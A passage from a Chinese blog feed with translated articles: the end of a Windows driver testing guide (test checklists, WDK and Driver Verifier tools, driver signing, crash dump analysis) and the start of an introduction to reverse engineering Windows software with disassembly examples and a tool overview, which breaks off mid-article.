<li>驱动程序如何与Windows工具与加密磁盘一起使用</li>
<li>驱动程序与防病毒软件的兼容性，因为防病毒软件也是文件过滤类型驱动</li>
</ul>
<h3 id="虚拟存储驱动程序">虚拟存储驱动程序</h3><p>在测试为虚拟存储创建的Windows驱动程序之前，您应该确保文件系统将是稳定的。对于虚拟存储驱动程序，应检查以下内容：</p>
<ul>
<li>驱动程序如何在以下情况下处理文件和文件夹<ul>
<li>打开操作</li>
<li>创建操作</li>
<li>编辑操作</li>
<li>保存操作</li>
<li>拷贝操作</li>
<li>剪切操作</li>
<li>重命名操作</li>
<li>删除操作</li>
</ul>
</li>
<li>驱动程在文件和文件夹执行搜索操作如何工作的。</li>
<li>驱动程序如何处理名称包含以下内容的文件<ul>
<li>字符过多</li>
<li>数字</li>
<li>空格</li>
<li>特殊字符</li>
<li>象形文字</li>
<li>非Unicode</li>
<li>西里尔字母</li>
</ul>
</li>
<li>驱动程序如何处理不同格式的文件：<ul>
<li>文本</li>
<li>图像</li>
<li>归档压缩文件</li>
<li>Office文件</li>
</ul>
</li>
<li>驱动程序如何处理具有各种属性的文件：<ul>
<li>只读属性</li>
<li>隐藏属性</li>
<li>系统属性</li>
<li>归档属性</li>
</ul>
</li>
<li>驱动程序如何处理更改文件权限以及如何使用各种NTFS功能：<ul>
<li>压缩</li>
<li>加密</li>
</ul>
</li>
<li>快捷方式（符号链接和硬链接）和隐藏副本是否正确。</li>
<li>驱动程序如何处理不同大小的文件：<ul>
<li>非常小</li>
<li>非常多非常小文件</li>
</ul>
</li>
<li>驱动程序如何处理包含大量子文件夹（超过五个）的文件夹。</li>
<li>驱动程序如何处理冲突，例如使用目标中已存在的文件名复制文件或取消复制或删除。</li>
<li>驱动程序如何处理保存从Internet或共享网络磁盘下载的文件。</li>
<li>在正常情况和极端情况下都可以进行磁盘安装/卸载。例如，尝试在复制到存储时卸载，然后在重新引导系统后检查磁盘是否已成功安装。</li>
<li>磁盘的读写速度。</li>
</ul>
<h3 id="USB设备驱动">USB设备驱动</h3><p>对于USB驱动程序测试，您应该尝试覆盖尽可能多的USB设备。您可以从最受欢迎的设备开始，例如闪存驱动器，打印机，扫描仪，鼠标，键盘，便携式硬盘驱动器，智能手机和读卡器。但是，您还应该测试不太受欢迎的设备，例如蓝牙设备，以太网设备，USB集线器，麦克风和耳机，网络摄像头和CD-ROM驱动器。<br>您应该考虑各种USB接口：USB 1.0、2.0、3.0和3.1。此外，不要忘记拔出/插入设备，禁用安全和不安全的设备以及在设备管理器中删除设备。此外，检查设备驱动程序的安装和卸载。</p>
<h2 id="0x04_驱动程序测试和分析实用工具">0x04 驱动程序测试和分析实用工具</h2><p>有许多用于测试Windows驱动程序的工具，这些工具使您可以监视系统中驱动程序的状态，验证其功能并执行测试。<br>内置的Windows工具足以获取有关驱动程序状态的基本信息（例如，是否已将其加载到系统中）。<br>内置Windows的工具：</p>
<ul>
<li>Msinfo32</li>
<li>Driverquery</li>
<li>Sc Driver Verifier<br>Sc Driver Verifier是一个系统内置工具，可让验证驱动程序功能。要深入分析测试驱动程序，您需要Windows驱动程序工具包（WDK）中提供的其他工具。</li>
</ul>
<h3 id="系统内置工具">系统内置工具</h3><h4 id="Windows系统信息工具（msinfo32）">Windows系统信息工具（msinfo32）</h4><p>Msinfo32允许您获取系统中所有已安装驱动程序的列表，每个驱动程序的类型，其当前状态（已加载/未加载）以及启动模式（系统/手动）。<br>若要实用msinfo32，请使用Win + R调出“运行”对话框，然后启动msinfo32。在系统信息控制台的左侧栏中，选择以下选项卡：软件环境&gt;系统驱动程序。</p>
<div align="center"><br><img src="/img/drivertest_msinfo32.png" alt align="center"><br></div><br>Msinfo32还可以查看和存储有关已注册驱动程序的信息。如果可以访问远程计算机的Windows Management Instrumentation（WMI），还可以查看远程计算机驱动程序列表，通过选项View &gt; Remote Computer。<br>### Driverquery命令行实用程序<br>Driverquery提供的信息类似于msinfo32中的信息。可以使用driverquery命令通过cmd启动它：<br><div align="center"><br><img src="/img/drivertest_driverquery.png" alt align="center"><br></div><br>还可以通过其他参数查询其他信息：<br>/V是用于详细输出的命令。它使您可以获得类似于msinfo32所示的驱动程序状态信息。<br>/SI提供有关已签名驱动程序的信息。<br>/S系统允许您获取有关远程系统上驱动程序的信息。<br><br>### 与服务控制管理器进行通信的sc命令<br>使用sc，命令可以查看驱动程序的状态以及启动或停止该驱动程序。要查看驱动程序列表，请运行以下命令：<br><em>sc query type= driver</em><br><div align="center"><br><img src="/img/drivertest_sc.png" alt align="center"><br></div>

<h3 id="Windows_Driver_Kit实用工具">Windows Driver Kit实用工具</h3><p>Windows驱动程序工具包（WDK）提供了一系列用于驱动程序测试的工具。WDK与MS Visual Studio集成在一起，但也可以用作一组独立的实用程序。WDK包含一组称为“设备基础测试”的测试模块，以及其他特定的实用程序，使您可以管理设备和驱动程序，监视资源使用情况，并具有用于验证的实用程序等。<br>设备基础测试集包括以下测试：</p>
<ul>
<li>并行硬件和操作系统（CHAOS）测试</li>
<li>覆盖率测试</li>
<li>CPU压力测试</li>
<li>驱动安装测试</li>
<li>I/O测试</li>
<li>渗透测试</li>
<li>即插即用测试</li>
<li>重启测试</li>
<li>休眠测试<br>为了执行测试，WDTF Simple I/O插件必须支持您的被测试设备。单击此<a href="https://docs.microsoft.com/en-gb/windows-hardware/drivers/wdtf/provided-wdtf-simpleio-plug-ins" target="_blank" rel="external">链接</a>以了解有关WDTF简单I/O插件的更多信息。<br>设备基本测试以dll库的形式组织，并且位于%ProgramFiles%\Windows Kits\10\Testing\Tests\Additional Test目录下(Windows 10)。<br>这些测试可以由TE.exe实用程序启动，该实用程序是Text Authoring和Execution Framework (TAEF)的一部分，必须与WDK一起安装。您可以在%ProgramFiles%\Windows Kits\10\Testing\Runtimes\TAEF目录中找到TE.exe。假设这是我们启动测试的示例：<br><em>TE.exe Devfund_Device_IO.dll /P:”DQ=DriverBinaryNames=testdriver.sys”</em><br>在此阶段，我们使用名为testdriver.sys的测试驱动程序作为参数启动设备I/O测试。设备基础测试和TAEF都非常适合驱动程序自动化测试。</li>
</ul>
<h3 id="Windows设备控制台（devcon-exe）">Windows设备控制台（devcon.exe）</h3><p>Windows设备控制台是一个命令行实用程序，它提供有关即插即用设备及其系统驱动程序的信息，并管理设备和特定设备类的筛选器驱动程序。使用devcon您可以安装、卸载、连接、断开和配置设备。Devcon允许您在搜索特定设备时设置模板。星号（*）可以替换查询中的一个或多个符号。<br>命令示例：</p>
<ul>
<li>devcon.exe hwids * 显示所有设备的名称和ID的列表</li>
<li>devcon.exe classes 显示所有设备类别的列表</li>
<li>devcon.exe driverfiles * 显示所有系统设备的驱动程序文件列表</li>
<li>devcon.exe classfilter USBDevice upper 显示DiskDrive设备类的筛选器驱动程序</li>
<li>devcon.exe /r classfilter DiskDrive upper !OldFilter +NewFilter 替换DiskDrive设备类的筛选器驱动程序</li>
</ul>
<h3 id="PoolMon_(poolmon-exe)">PoolMon (poolmon.exe)</h3><p>内存池监视器显示有关downloadable和nondownloadable核心内存分配的信息。该实用程序用于在测试时检测内存泄漏。</p>
<div align="center"><br><img src="/img/drivertest_poolmon.png" alt align="center"><br></div><br>驱动程序的内存分配统计信息按标记而不是按驱动程序名称排序。应该使用ExAllocatePoolWithTag和ExAllocatePoolWithQuotaTag函数在驱动程序代码中设置此标记。如果未在代码中设置标签，则系统将设置”None”标签,这样的话定位驱动内存泄漏将会很困难。<br><br>### Windows Hardware Lab Kit<br>Windows Hardware Lab Kit（HLK）是用于测试基于Windows 10的设备的测试框架。要在Windows 7，Windows 8和Windows 8.1上进行Windows设备测试，您应该使用Windows HLK的前身Windows Hardware Certification Kit（HCK）。<br>在使用Windows HLK进行测试时，应使用由两个组件组成的环境：HLK测试服务器（controller）和测试系统（client）。HLK控制器管理一组测试，将它们与测试系统连接，并定义执行计划。该控制器允许您管理一组客户端计算机上的测试。在客户端系统中，设备和驱动程序被配置用于进一步的测试，并执行测试方案。可以通过以下步骤完成准备和测试过程：<br>- 1.将HLK c;ient安装在专用计算机上。<br>- 2.将agent程序安装在一台或多台测试计算机上。<br>- 3.创建一组以逻辑方式连接一个或多个计算机的测试计算机。<br>- 4.创建一个基于控制器的项目，该项目定义要测试的元素。<br>- 5.选择一个测试目标，例如测试机器的外部设备或软件组件，例如过滤器驱动程序。<br>- 6.选择并启动测试。您可以使用播放列表执行一组特定的场景。<br>- 7.查看并分析测试结果。<br>Windows HLK允许您测试多种类型的设备。您可以通过点击链接<a href="https://docs.microsoft.com/en-us/windows-hardware/test/hlk/testref/hardware-lab-kit-test-reference" target="_blank" rel="external">链接</a>了解有关Windows HLK的更多信息。<br><br>### Driver Verifier<br><br>Driver Verifier是一个内置Windows实用程序，用于验证内核模式驱动程序。Driver Verifier使您能够检测可能损坏操作系统的驱动程序错误。使用WDK工具进行手动或自动测试时，Driver Verifier最有效。<br>Driver Verifier作为二进制Verifier.exe文件存储在%WinDir%\system32目录中。该实用程序可以以两种模式启动：通过命令行和Driver Verifier管理器。要启动命令行版本，请以管理员身份运行命令提示符，然后输入带有至少一个参数的verifier命令，例如help -verifier /？）。要打开驱动程序验证程序管理器，请运行不带参数的verifier。<br>让我们以Driver Verifier Manager为例查看驱动程序验证过程：<br>- 1.运行Driver Verifier Manager：Win + R&gt;verifier<br>- 2.选择一组标准测试或创建自定义测试。管理器还可以显示和删除当前设置以及显示有关经过验证的驱动程序的信息：<br><div align="center"><br><img src="/img/drivertest_verify.png" alt align="center"><br></div><br>- 3.选择一个或几个驱动程序进行测试。<br>- 4.重新启动计算机。将根据所选设置对驱动程序进行测试，直到将其从经过验证的驱动程序列表中删除。<br><br>#### Driver Verifier标准设置<br><br>下面，我们将介绍Windows 10 Driver Verifier程序的标准设置。在不同的Windows版本中，标准设置和补充设置的列表可能有所不同。<br>以下是Windows 10中Driver Verifier程序的标准选项：<br>- Special Pool<br>- Force IRQ Checking<br>- Pool Tracking<br>- I/O Verification<br>- Deadlock Detection<br>- DMA Verification<br>- Security Checks<br>- Miscellaneous Checks<br>- DDI Compliance Checking<br>下面我们看下每项设置的详细信息：<br><strong>Special Pool</strong><br>Driver Verifier的Special Pool选项可以分配出一块可以测试出驱动程序是否访问了被释放内存内存空间，这样就可以测试出驱动是否有内存访问问题。<br><strong>Force IRQ Checking</strong><br>在Windows中，如果启用了自旋锁选项，驱动程序将无法访问具有高IRQL的分页内存。Force IRQ Checking选项可以检测到此类问题。<br><strong>Pool Tracking</strong><br>Pool Tracking监视驱动程序的内存分配。 Driver Verifier检查为驱动程序分配的内存最终是否被释放。这有助于检测内存泄漏。<br><strong>I/O Verification</strong><br>I/O Verification选项可检测驱动程序对输入/输出的实用是否正确。在Windows 7及更高版本中，此选项还包含增强的I/O检查功能，该功能对以下请求执行压力测试：PnP IRP、电源IRP及WMI IRP。通过死锁检测，Driver Verifier可以监视驱动程序使用的同步对象，例如互斥锁和自旋锁，这就是可以检测到潜在的死锁。<br><strong>DMA Verification</strong><br>使用DMA Verification，Driver verification可以监视对Direct Memory的使用。DMA允许设备不经过CPU直接使用内存。<br><strong>Security Checks</strong><br>Driver Verifier的Security Checks选项可以检测出一些安全问题，如内核函数访问用户态内存地址或则不正确的参数使用。<br><strong>Miscellaneous Checks</strong><br>启用Miscellaneous Checks后，将对驱动程序进行测试，以检查可能导致驱动程序或系统崩溃的潜在错误，例如驱动释放了其他驱动正在使用的内存空间。<br><strong>DDI Compliance Checking</strong><br>在与操作系统的内核接口进行的通信（设备驱动程序接口）中检查驱动程序是否存在潜在错误。<br><br>为了有效地检测Driver Verifier中的错误，您应该遵循以下建议：<br>- 1.除非刻意这样，否则不要同时验证多个驱动程序。<br>- 2.下启用内存转储生成应对可能的系统崩溃情况（BSOD）。<br>- 3.如果需要启用调试模式并使用调试器通过网络或COM/USB端口连接到被测试系统。<br><br>### 驱动数字签名<br>在Windows XP，Windows Vista和Windows 7中，对安装驱动程序软件包的软件包签名没有严格要求。因此，您可以轻松安装没有签名的驱动程序。但是如果安装包未进行签名，会看到以下警告：<br><div align="center"><br><img src="/img/drivertest_warnning.png" alt align="center"><br></div>

<p>为了使驱动程序被识别为来自受信任的发布者，必须在Windows XP中使用Windows硬件质量实验室（WHQL）签名对驱动程序包进行签名。在Windows Vista和Windows 7中，必须使用受信任的根CA证书对驱动程序包进行签名。在Windows 8，Windows 8.1和Windows 10中，需要对驱动程序签名，因为没有它就无法安装驱动程序。过去需要使用SHA-1算法对证书进行加密。现在，SHA-1已过时，通常应该使用SHA-2算法应用于证书。<br>您可以通过以下<a href="https://technet.microsoft.com/en-us/library/security/2880823" target="_blank" rel="external">链接</a>了解有关SHA-2算法的更多信息。</p>
<h3 id="驱动sys文件签名">驱动sys文件签名</h3><p>在内核模式下运行驱动程序之前，Windows将检查驱动程序二进制.sys文件的数字签名。值得注意的是，Windows XP和Windows Vista 32位不需要数字驱动程序签名。Windows Vista 64位，Windows 7，Windows 8和Windows 8.1要求签名带有在其根目录中包含Microsoft Code Verification Root的证书，或者由内核信任的另一个证书。Windows 10版本1607及更高版本要求使用Windows Hardware Developer Center网站对驱动程序进行签名。<br>为了Windows驱动程序测试，您可以暂时禁用数字驱动程序签名检查。在Windows 10中，可以通过以下方式执行此操作：</p>
<ul>
<li>1.按住Shift键，然后在Windows主菜单中选择“重新启动”选项。</li>
<li>2.选择Troubleshoot -&gt; Advanced Options -&gt; Startup Settings -&gt; Restart</li>
<li>3.在启动设置中，按F7键选择禁用驱动程序签名强制实施选项。<br><div align="center"><br><img src="/img/drivertest_disable.png" alt align="center"><br></div><br>要在启用了安全启动选项的Windows中测试驱动程序，必须确保驱动程序具有有效的签名。</li>
</ul>
<h2 id="0x05_问题定位">0x05 问题定位</h2><p>驱动程序中运行错误可能导致系统崩溃。因此，除了定义特定步骤外，本地化错误还意味着了解驱动程序是否造成了BSOD。为了确定这一点，您必须查看系统内存转储。这是在BSOD之后自动收集的，您可以在C:\Windows\Memory.dmp目录中找到它。要查看完整的内核转储，您应该告诉系统收集它。内核转储还包含有关磁盘上可用内存的必要信息。要获取此信息，您应该打开Advanced system settings &gt; Startup，然后单击Settings。</p>
<div align="center"><br><img src="/img/drivertest_enabledmp.png" alt align="center"><br></div><br>检查是否启用了“完整内存转储”或“内核内存转储”选项。<br><div align="center"><br><img src="/img/drivertest_fulldmp.png" alt align="center"><br></div>

<p>在这些设置中，您可以更改内存转储的存储位置。<br>一旦有了完整的dmp，就应该对其进行分析。这是WinDbg有用的地方。使用此工具之前，您必须下载特定的Microsoft符号。您可以阅读<a href="https://msdn.microsoft.com/en-us/library/windows/desktop/ee416588(v=vs.85" target="_blank" rel="external">本指南</a>.aspx)以了解操作方法。<br>打开dmp文件并输入!analyze -v命令。注意堆栈，您将看到产生BSOD的原因。在某些情况下，您将无法从系统中获取转储文件，因为系统一直在崩溃。在这种情况下，您应该使用Windows高级启动选项。然后，您可以在几种特殊模式下运行系统。最简单，最可靠的一种是安全模式模式。在安全模式下，系统的一些操作将受到限制，您需要的只是获取C:\Windows文件夹中的dmp文件，这种操作安全模式使支持的。<br>您也可以尝试在系统故障时禁用自动重启功能，这可能有助于防止持续重启。如果系统崩溃，则应检查driver verifier是否启用。当开发人员尝试重现该错误时，此信息可能对他们非常有帮助。除了系统崩溃之外，您还可能面临其他问题，例如与功能或性能相关的问题。<br>要定位功能问题，您应该采取以下措施：<br>尝试在另一个环境中（在没有防病毒软件的其他操作系统中，在另一个文件系统上，使用实体计算机等）中重现问题。您也可以尝试其他条件，例如不同类型的文件和不同的文件大小。如果问题与您的USB设备有关，请检查其他类型的设备。如果网络是导致网络设备驱动程序错误的潜在原因，请检查各种网络设置（启动时间，带宽，启用或禁用防火墙）。当问题仅针对具有特定权限的用户出现时，请使用其他权限（管理员或标准）去定位问题。<br>如果问题与性能有关，则您的操作将取决于您要改善其性能的元素：</p>
<ul>
<li>如果问题出在网络设备驱动程序中，请模拟网络延迟或尝试在高速网络中重现这个问题。</li>
<li>如果问题与文件操作有关，请使用不同数量的不同大小的文件进行验证。</li>
<li>如果问题与USB摄像头有关，请使用其他应用层软件再进行测试验证。</li>
</ul>
<h2 id="0x06_驱动测试报告模板">0x06 驱动测试报告模板</h2><div align="center"><br><img src="/img/drivertest_testsample.png" alt align="center"><br></div>

<h2 id="0x07_结论">0x07 结论</h2><p>在本文中，我们描述了驱动程序的主要类型以及测试它们的方法和实用工具。Windows内核驱动程序测试与测试桌面应用程序有很大不同。如果驱动程序包含错误，通常会影响整个系统的稳定性，并最终导致BSOD。检测、定位和消除驱动程序错误，可以大大降低了最终用户系统行为不稳定的风险。</p>
<p><em>原文链接：<a href="https://www.apriorit.com/qa-blog/464-windows-driver-testing-basics" target="_blank" rel="external">https://www.apriorit.com/qa-blog/464-windows-driver-testing-basics</a></em></p>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_前言">0x00 前言</h2><p>本文旨在帮助你测试Windows驱动程序。因为有很多种不同的驱动程序，因此我们将介绍关于每种类型驱动程序的细节及各种驱动程序测试过程的不同点。我们也将涉及到一些驱动测试辅助工具和另一个重要的主题驱动数字签名。<br>]]>
    
    </summary>
    
      <category term="测试" scheme="http://www.youngroe.com/tags/%E6%B5%8B%E8%AF%95/"/>
    
      <category term="驱动" scheme="http://www.youngroe.com/tags/%E9%A9%B1%E5%8A%A8/"/>
    
      <category term="Kernel" scheme="http://www.youngroe.com/categories/Kernel/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[如何正确的对Windows软件进行逆向工程（翻译/转载）]]></title>
    <link href="http://www.youngroe.com/2019/04/06/Windows/how-to-reverse-engineer-software-windows-in-a-right-way/"/>
    <id>http://www.youngroe.com/2019/04/06/Windows/how-to-reverse-engineer-software-windows-in-a-right-way/</id>
    <published>2019-04-06T04:45:15.000Z</published>
    <updated>2020-02-15T07:54:24.201Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_前言">0x00 前言</h2><p>你有没有想过要拆开某个机械装置了解它的工作原理呢？嗯，谁没有呢。这种欲望也是是逆向工程的主导力量，逆向对于分析产品安全性、在不运行可疑的.exe文件的情况下查明其用途、恢复丢失的文档、开发基于旧软件的新解决方案等非常有用。<br><a id="more"></a><br>在本文中，我们讨论执行逆向工程所需的知识结构、逆向工程的基本原理、Windows软件、反汇编器和工具。我们还提供了对一个程序进行逆向工程的步骤示例。</p>
<h2 id="0x01_什么是逆向工程？">0x01 什么是逆向工程？</h2><p>逆向工程是发现硬件或软件背后的原理（例如其体系结构和内部结构）的过程。简单来说逆向工程就是搞清楚程序是如何工作的。<br>显然，如果您有文档，那么整个过程将变得更加简单。但是经常会发生这样的情况：没有文档，您需要通过另外的途径来学习某个软件的工作方式。<br>您什么时候需要对软件进行逆向工程，逆向工程对你有什么帮助？<br>逆向工程在计算机科学领域有许多用途，包括：</p>
<ul>
<li>研究网络通讯协议</li>
<li>查找恶意软件中使用的算法，例如计算机病毒，特洛伊木马，勒索软件等。</li>
<li>研究用于存储任何类型信息的文件格式，例如电子邮件数据库和磁盘映像</li>
<li>检查您自己的软件抵抗逆向工程的能力</li>
<li>改善软件与系统和第三方软件的兼容性</li>
<li>使用未文档化的系统功能<br>逆向工程的合法性取决于其目的以及软件的使用方式。假设您已合法获得该软件的副本，则上述所有目的都是完全合法的。但是，例如，如果您打算对软件某些闭源功能进行逆向工程，然后在另一个软件中使用，则可能会遇到麻烦。</li>
</ul>
<p>关于<a href="https://en.wikibooks.org/wiki/Reverse_Engineering/Legal_Aspects" target="_blank" rel="external">法律文件</a>，最终用户许可协议（EULA）通常禁止进行逆向工程。但是美国<a href="https://www.law.cornell.edu/uscode/text/17/1201" target="_blank" rel="external">数字千年版权法案</a>规定，如果为了提高与其他产品的兼容性而逆向某个软件是合法的。<br>法律要求因国家/地区而异，因此请在开始之前花点时间研究一下。<br>现在，让我们看看如何对软件进行逆向工程。</p>
<h2 id="0x01_逆向工程需要什么？">0x01 逆向工程需要什么？</h2><p>要开始逆向软件，您需要：</p>
<ul>
<li>1.您想要使用逆向工程领域的知识</li>
<li>2.一些能够再反汇编一个软件时应用你专业知识的工具<br>让我们考虑一个与软件不相关的例子。假设您有一只手表，想确定它是机械的、石英的还是自动的。<br>拥有该领域的知识意味着您应该知道有三种类型的手表。此外，您应该知道，如果有电池，它应该在手表内部，打开手表就可以看到它。您还应该了解手表的内部结构，电池的外观以及打开表壳所需的工具的基本知识。拥有可以验证知识的工具，意味着您需要一把螺丝起子或其他专用工具，才能打开手表。<br>就像对手表进行逆向工程需要特定的技能和工具一样，逆向工程软件也需要其自身在特定领域的知识和工具。</li>
</ul>
<h2 id="0x02_理论知识-软件逆向工程过程">0x02 理论知识-软件逆向工程过程</h2><p>对于不同的软件逆向工程任务，您需要不同类型的知识。当然，有一些常识可以帮助您完成大多数逆向工程任务：常见的应用程序结构，编程语言，编译器等知识。但是，如果没有特定的理论知识，就无法完成具体的逆向工程任务。</p>
<table>
<thead>
<tr>
<th style="text-align:left">逆向任务</th>
<th style="text-align:left">你需要的基础知识</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">对有网络行为的软件进行逆向工程</td>
<td style="text-align:left">进程间通信、网络的结构、连接、网络数据包等</td>
</tr>
<tr>
<td style="text-align:left">逆向加密算法</td>
<td style="text-align:left">密码学及最常使用的密码学相关算法</td>
</tr>
<tr>
<td style="text-align:left">逆向文件结构</td>
<td style="text-align:left">基本文件概念以及不同的系统或组件如何使用文件</td>
</tr>
</tbody>
</table>
<p>在逆向分析某些软件时使用一些技巧可以节省大量时间。对于有文件交互的软件，可以输入一些比较特殊的数据，然后记录实际存储时候的数据的大小和偏移，这些信息有助于你发现这些文件的内部结构。<br>进行逆向工程过程时，软件开发人员通常使用反汇编程序来查找适当的算法和程序逻辑。有许多不同的可执行文件格式，编译器（提供不同的输出）和操作系统，因为这种多样性，很难通过单一的技术去逆向各种类型的软件。<br>要理解反编译的代码，您需要一些有关汇编语言，函数调用约定，栈结构，堆栈框架等方知识。<br>了解不同语言的汇编程序输出可能有助于您发现原始功能。让我们来看一些Windows x86平台的示例。<br>假设我们有以下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">count++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; count;</span><br></pre></td></tr></table></figure>
<p>如果我们将此代码编译为可执行文件，则会在反汇编程序中看到以下内容：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">004113</span>DE loc_4113DE:</span><br><span class="line"><span class="number">004113</span>DE     mov     eax, [ebp-<span class="number">14</span>h]</span><br><span class="line"><span class="number">004113E1</span>     add     eax, <span class="number">1</span></span><br><span class="line"><span class="number">004113E4</span>     mov     [ebp-<span class="number">14</span>h], eax</span><br><span class="line"><span class="number">004113E7</span> loc_4113E7:</span><br><span class="line"><span class="number">004113E7</span>     cmp     [ebp-<span class="number">14</span>h], <span class="number">0</span>Ah</span><br><span class="line"><span class="number">004113</span>EB     jge     <span class="keyword">short</span> loc_4113F8</span><br><span class="line"><span class="number">004113</span>ED     mov     eax, [ebp-<span class="number">8</span>]</span><br><span class="line"><span class="number">004113F</span>0     add     eax, <span class="number">1</span></span><br><span class="line"><span class="number">004113F</span>3     mov     [ebp-<span class="number">8</span>], eax</span><br><span class="line"><span class="number">004113F</span>6     jmp     <span class="keyword">short</span> loc_4113DE</span><br><span class="line"><span class="number">004113F</span>8 loc_4113F8:</span><br><span class="line"><span class="number">004113F</span>8     mov     ecx, ds:?<span class="built_in">cout</span>@<span class="built_in">std</span></span><br><span class="line"><span class="number">004113F</span>E     push    eax</span><br><span class="line"><span class="number">00411400</span>     call    ds:basic_ostream@<span class="keyword">operator</span>&lt;&lt;(<span class="keyword">int</span>)</span><br><span class="line"><span class="number">00411404</span>     xor     eax, eax</span><br><span class="line"><span class="number">00411406</span>     retn</span><br></pre></td></tr></table></figure>
<p>如上，for循环最后变成了由比较和跳转语句组成的汇编代码，注意这里的汇编代码并未使用ecx作为循环计数器，另外这里的局部变量时[ebp-14h]和[ebp-8]。<br>让我们看看使用release模式编译会汇编代码会有什么变化:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00401000</span> main     proc near</span><br><span class="line"><span class="number">00401000</span>     mov     ecx, ds:?<span class="built_in">cout</span>@<span class="built_in">std</span></span><br><span class="line"><span class="number">00401006</span>     push    <span class="number">0</span>Ah</span><br><span class="line"><span class="number">00401008</span>     call    ds:basic_ostream@<span class="keyword">operator</span>&lt;&lt;(<span class="keyword">int</span>)</span><br><span class="line"><span class="number">0040100</span>E     xor     eax, eax</span><br><span class="line"><span class="number">00401010</span>     retn</span><br><span class="line"><span class="number">00401010</span> main     endp</span><br></pre></td></tr></table></figure>
<p>这段代码看起来与之前的代码完全不同。这是因为代码被优化了。删除了该循环，因为除了将count变量增加到10之外，循环没有做任何其他事情，因此优化程序决定仅保留count变量的最终值，并将该值直接作为count输出运算符的参数。<br>目前，我们使用的编译器非常擅长优化代码。这就是为什么在进行逆向工程时，最好理解代码背后的思想（代码原理），而不是尝试获取原始代码本身。如果您了解代码背后的原理，则只需编写适合原始任务的原型即可。<br>如果您编译不同的运算符，结构和其他语言构造，那么你就知道汇编代码将非常有用。了解最终的汇编代码是开始C++逆向工程过程的一种好方法，但是我们在这里不介绍它的技术细节。</p>
<h2 id="0x03_逆向工程Windows软件的实用工具">0x03 逆向工程Windows软件的实用工具</h2><p>在我们的<a href="https://www.apriorit.com/dev-blog/173-application-architecture-research" target="_blank" rel="external">应用程序架构研究中</a>，我们已经描述了几种逆向工程工具，包括ProcessMonitor和ProcessExplorer。这些工具对于逆向工程绝对是必不可少的。<br>在本节中，我们将回顾最受欢迎的反汇编程序以及用于逆向工程项目的其他一些工具。<br>您可以在有关<a href="https://www.apriorit.com/dev-blog/366-software-reverse-engineering-tools" target="_blank" rel="external">最佳软件逆向工程工具的文章</a>中获得更多详细信息和用法示例。</p>
<h3 id="反汇编工具">反汇编工具</h3><p>反汇编程序是将可执行文件转换为汇编语言的程序。最受欢迎的是<a href="https://www.hex-rays.com/products/ida/" target="_blank" rel="external">IDA Pro</a><br><strong>IDA Pro</strong></p>
<div align="center"><br><img src="/img/reverse_idapro.png" alt="IDA Pro" align="center"><br></div><br>IDA Pro是一种方便而强大的反汇编工具。由很多功能，可让您快速反汇编一个软件。它可以显示函数调用树，解析可执行文件的导入和导出，并显示有关它们的信息。它甚至可以用C语言显示代码。它还支持多种CPU架构，因此可以使用IDA Pro对ARM，AVR，M68k和许多其他架构进行逆向工程。<br><br><strong>Radare</strong><br><div align="center"><br><img src="/img/reverse_radare.jpg" alt="Radare" align="center"><br></div>

<p><a href="https://rada.re/r/" target="_blank" rel="external">Radare</a>反汇编工具是IDA的替代产品。它基本上具有IDA的所有功能。虽然没有那么强大和稳定。但是它是免费和开源的。Radare本身是一个控制台工具，但是它具有Cutter前端，这使其成为IDA的可选替代。</p>
<h3 id="Windows_Sysinternals">Windows Sysinternals</h3><p><a href="https://docs.microsoft.com/en-us/sysinternals/" target="_blank" rel="external">Windows Sysinternals</a>实用程序通常用于Microsoft Windows环境的管理，诊断，故障排除和监视。但它们也适用于逆向Windows软件。<br><strong>TCPView</strong>是一个网络嗅探器，它显示来自所有进程的有关TCP/UDP数据包的所有信息。该工具对于逆向网络协议很有用。<br><strong>PortMon</strong>是一个物理系统端口监视器。它监视串行和并行端口以及通过它们的所有流量。<br><strong>WinObj</strong>以分层结构显示系统中的所有全局对象。当逆向使用同步对象（例如互斥量和信号量）的应用程序以及内核模式驱动程序时，此工具很有用。</p>
<h3 id="网络监控工具">网络监控工具</h3><p><strong>Wireshark</strong></p>
<div align="center"><br><img src="/img/reverse_Wireshark.jpg" alt="Wireshark" align="center"><br></div>

<p><a href="https://www.wireshark.org/" target="_blank" rel="external">Wireshark</a>是功能最强大的网络嗅探器之一。它不仅允许您捕获网络流量，而且还包含针对各种网络协议的解析器，这些解析器从诸如以太网，TCP和IP的真正底层开始，到诸如WebSockets和XMPP的特定于应用程序的协议。</p>
<p><strong>Fiddler</strong></p>
<div align="center"><br><img src="/img/reverse_Fiddler.jpg" alt="Fiddler" align="center"><br></div><br>Fiddler是一个Web代理，它记录来自浏览器的流量，并允许您分析HTTP/HTTPS请求。与Wireshark不同，它显示HTTP会话而不是单独的网络数据包。Fiddler还允许您在监视SOAP，REST和AJAX请求时分析通过HTTP发送的压缩数据，并分析JSON和XML数据(译者注:搭配proxifier使用更强大)。<br><br><strong>API Monitor</strong><br><br><div align="center"><br><img src="/img/reverse_apimonitor.png" alt="API Monitor" align="center"><br></div>

